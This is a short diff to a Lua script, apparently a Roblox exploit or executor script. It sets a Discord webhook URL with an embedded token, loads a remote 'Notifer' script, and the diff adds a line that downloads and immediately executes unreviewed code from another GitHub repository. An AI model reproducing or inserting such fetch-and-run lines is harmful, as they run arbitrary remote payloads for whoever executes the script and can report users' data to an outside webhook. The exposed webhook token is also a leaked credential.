@@ -15,3 +15,7 @@ getgenv().Webhook = "https://discord.com/api/webhooks/1234998457832312952/YXaurO
 
 coroutine.wrap(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/JustAScripts/Webhook/main/Notifer.lua"))()
 end)()
+
+
+wait(0.4)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/qtoolv3/main/qtoolv3", true))()
